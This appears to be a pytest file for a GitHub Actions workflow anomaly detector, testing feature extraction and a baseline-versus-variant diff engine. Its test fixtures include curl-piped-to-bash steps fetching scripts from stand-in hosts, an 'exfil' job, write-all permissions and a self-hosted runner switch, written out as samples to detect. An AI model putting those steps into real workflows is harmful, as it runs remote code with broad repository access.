"""Unit tests for the structural feature extractor and schema consistency.

Verifies:
1. Feature vector size, ordering, and data type stability.
2. Zero-division resilience and missing field handling.
3. Accurate extraction of permissions, runners, action pinning, triggers, and secrets.
4. Structural differential analysis (diff engine) and findings generation.
5. Integrity of the generated dataset/features.csv.
"""

import os
import pandas as pd
import pytest

from backend.app.parser import parse_workflow
from backend.app.features import (
    FEATURE_DEFINITIONS,
    FEATURE_NAMES,
    FEATURE_SCHEMA_VERSION,
    TOTAL_FEATURES_COUNT,
    extract_feature_vector,
    extract_features,
    extract_features_dataframe,
    extract_workflow_diff,
)

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
DATASET_DIR = os.path.join(ROOT_DIR, "dataset")
FEATURES_CSV_PATH = os.path.join(DATASET_DIR, "features.csv")


def test_schema_metadata_integrity():
    """Verify feature definitions and ordering match FEATURE_NAMES and count."""
    assert len(FEATURE_NAMES) == TOTAL_FEATURES_COUNT
    assert len(FEATURE_NAMES) == 30
    assert FEATURE_SCHEMA_VERSION == "1.0.0"

    for name in FEATURE_NAMES:
        assert name in FEATURE_DEFINITIONS
        meta = FEATURE_DEFINITIONS[name]
        assert "type" in meta
        assert "category" in meta
        assert "description" in meta


def test_missing_and_empty_workflow_resilience():
    """Verify that empty or minimal workflows produce consistent vectors without division-by-zero."""
    minimal_yaml = "name: Minimal\njobs: {}\n"
    parsed = parse_workflow(minimal_yaml)
    features = extract_features(parsed)
    vector = extract_feature_vector(parsed)

    assert len(features) == TOTAL_FEATURES_COUNT
    assert len(vector) == TOTAL_FEATURES_COUNT

    # Validate default values and lack of NaNs
    for k, v in features.items():
        assert not pd.isna(v), f"Feature {k} returned NaN"
        assert v >= 0, f"Feature {k} returned negative value {v}"

    assert features["job_count"] == 0
    assert features["step_count"] == 0
    assert features["avg_steps_per_job"] == 0.0
    assert features["github_hosted_ratio"] == 0.0
    assert features["unpinned_actions_ratio"] == 0.0


def test_permission_features():
    """Verify broad write and OIDC permissions are accurately flagged."""
    broad_perm_yaml = """
    name: Broad Permissions
    on: push
    permissions: write-all
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - run: echo ok
    """
    p1 = parse_workflow(broad_perm_yaml)
    f1 = extract_features(p1)
    assert f1["has_broad_write_permissions"] == 1
    assert f1["has_permissions_block"] == 1

    oidc_perm_yaml = """
    name: OIDC Perms
    on: pull_request
    permissions:
      id-token: write
      contents: read
    jobs:
      deploy:
        runs-on: ubuntu-latest
        steps:
          - run: echo deploy
    """
    p2 = parse_workflow(oidc_perm_yaml)
    f2 = extract_features(p2)
    assert f2["has_id_token_write"] == 1
    assert f2["has_contents_write"] == 0
    assert f2["has_broad_write_permissions"] == 0
    assert f2["explicit_permission_count"] == 2


def test_runner_features():
    """Verify detection of self-hosted vs GitHub-hosted runners."""
    self_hosted_yaml = """
    name: Self-Hosted Runner
    on: push
    jobs:
      job1:
        runs-on: [self-hosted, linux, gpu]
        steps:
          - run: nvidia-smi
      job2:
        runs-on: ubuntu-latest
        steps:
          - run: echo gh
    """
    parsed = parse_workflow(self_hosted_yaml)
    features = extract_features(parsed)
    assert features["has_self_hosted_runner"] == 1
    assert features["job_count"] == 2
    assert features["github_hosted_ratio"] == 0.5
    assert features["runner_types_count"] == 4  # self-hosted, linux, gpu, ubuntu-latest


def test_action_pinning_and_supply_chain():
    """Verify pinned SHA commit vs unpinned tag action counts and ratios."""
    action_yaml = """
    name: Actions Test
    on: push
    jobs:
      test:
        runs-on: ubuntu-latest
        steps:
          - name: Pinned SHA
            uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
          - name: Unpinned Major Tag
            uses: actions/setup-python@v5
          - name: Third Party Unpinned
            uses: third-party/untrusted-action@master
    """
    parsed = parse_workflow(action_yaml)
    features = extract_features(parsed)
    assert features["total_actions_count"] == 3
    assert features["pinned_actions_count"] == 1
    assert features["unpinned_actions_count"] == 2
    assert round(features["unpinned_actions_ratio"], 2) == 0.67
    assert features["third_party_actions_count"] == 1


def test_shell_and_network_command_features():
    """Verify curl/wget command detection in shell steps."""
    curl_yaml = """
    name: Curl Step
    on: push
    jobs:
      setup:
        runs-on: ubuntu-latest
        steps:
          - run: echo 'Starting'
          - run: curl -fsSL https://malicious.org/install.sh | bash
    """
    parsed = parse_workflow(curl_yaml)
    features = extract_features(parsed)
    assert features["shell_step_count"] == 2
    assert features["shell_step_ratio"] == 1.0
    assert features["has_curl_or_wget_step"] == 1


def test_structural_diff_engine():
    """Verify structural diffing between a baseline workflow and an anomalous variant."""
    baseline_yaml = """
    name: Flask CI
    on: push
    jobs:
      tests:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - run: pytest
    """
    anomalous_yaml = """
    name: Flask CI
    on: push
    permissions: write-all
    jobs:
      tests:
        runs-on: [self-hosted, linux]
        steps:
          - uses: actions/checkout@v4
          - run: curl -fsSL https://payload.internal/script.sh | bash
          - run: pytest
      extra-job:
        runs-on: ubuntu-latest
        steps:
          - run: echo exfil
    """
    base_wf = parse_workflow(baseline_yaml)
    anom_wf = parse_workflow(anomalous_yaml)

    diff = extract_workflow_diff(anom_wf, base_wf)

    assert "extra-job" in diff["added_jobs"]
    assert diff["diff_metrics"]["diff_jobs"] == 1
    assert diff["diff_metrics"]["diff_steps"] == 2
    assert diff["diff_metrics"]["has_permission_escalation"] == 1
    assert diff["diff_metrics"]["has_runner_change"] == 1

    finding_categories = [f["category"] for f in diff["findings"]]
    assert "permission_change" in finding_categories
    assert "runner_change" in finding_categories
    assert "step_addition" in finding_categories
    assert "job_addition" in finding_categories


def test_features_csv_dataset_validity():
    """Verify the generated features.csv has 28 rows, 35 columns, and no missing values."""
    assert os.path.exists(FEATURES_CSV_PATH), f"features.csv not found at {FEATURES_CSV_PATH}"
    df = pd.read_csv(FEATURES_CSV_PATH)
    assert df.shape == (28, 35)

    # Verify ID and Label columns
    assert "id" in df.columns
    assert "pair_id" in df.columns
    assert "label" in df.columns
    assert "anomaly_category" in df.columns

    # Verify all 30 feature columns are present and strictly non-null
    for f_name in FEATURE_NAMES:
        assert f_name in df.columns, f"Feature column {f_name} missing from CSV"
        assert not df[f_name].isna().any(), f"Null values detected in feature column {f_name}"
